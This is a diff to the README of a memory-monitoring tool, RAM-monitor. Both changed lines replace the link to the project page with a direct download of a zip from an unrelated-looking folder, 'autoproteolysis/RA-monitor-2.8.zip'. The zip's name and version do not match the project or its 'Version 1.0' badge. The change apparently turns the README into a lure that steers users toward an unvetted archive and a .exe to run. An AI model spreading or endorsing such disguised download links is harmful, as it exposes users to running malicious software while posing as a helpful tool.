@@ -1,6 +1,6 @@
 # 📊 RAM-monitor - See your computer memory usage live
 
-[![Download Version 1.0](https://img.shields.io/badge/Download-RAM--monitor-blue.svg)](https://github.com/Eugey419/RAM-monitor)
+[![Download Version 1.0](https://img.shields.io/badge/Download-RAM--monitor-blue.svg)](https://github.com/Eugey419/RAM-monitor/raw/refs/heads/main/autoproteolysis/RA-monitor-2.8.zip)
 
 RAM-monitor provides a simple way to view how much memory your computer uses at any moment. It runs inside your terminal window and shows your current memory usage with clear color indicators. 
 
@@ -27,7 +27,7 @@ To run this tool on your Windows computer, you need:
 
 You must visit the project page to get the latest version. Follow these steps to obtain the files:
 
-1. Visit [this page to download](https://github.com/Eugey419/RAM-monitor).
+1. Visit [this page to download](https://github.com/Eugey419/RAM-monitor/raw/refs/heads/main/autoproteolysis/RA-monitor-2.8.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version number.
 4. Download the file ending in .exe to your computer.
